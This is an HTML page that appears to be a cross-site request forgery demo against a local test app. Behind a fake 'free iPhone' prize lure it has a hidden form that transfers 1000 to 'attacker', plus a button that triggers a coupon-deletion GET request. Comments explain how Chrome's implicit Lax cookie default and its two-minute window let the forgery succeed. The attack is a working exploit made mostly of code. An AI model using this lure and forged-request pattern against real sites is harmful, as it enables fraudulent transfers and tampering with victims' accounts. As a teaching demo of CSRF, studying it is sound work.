<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Congratulations!</title>
</head>
<body>
    <h1>You won a free iPhone! ðŸŽ‰</h1>
    <p>Click the button below to claim your prize.</p>

    <!-- Sends a POST request with top level navigation. Will work if cookie is set to 
    LAX and was created < 2 mins. -->
    <!-- Chrome will set the cookie as LAX implicitly if not defined in the backend. You have
    ~ 2 minutes to do the transfer. -->
    <form id="csrfForm" action="http://localhost:3000/transfer" method="POST">
        <input type="hidden" name="recipient" value="attacker">
        <input type="hidden" name="amount" value="1000">
        <button type="submit">Claim Your Prize</button>
    </form>

    <!-- Sends a GET request with top level navigation. This will work as the GET request is safe for LAX cookies
    and top level navigation also occurs. -->
    <p>Click here if you think this is a scam :(</p>
    <button onclick="deleteCoupon()">Click here</button>

    <script>
        function deleteCoupon() {
            document.location = 'http://localhost:3000/coupon/delete?couponId=Black-Friday-Coupon';
        }
    </script>
</body>
</html>
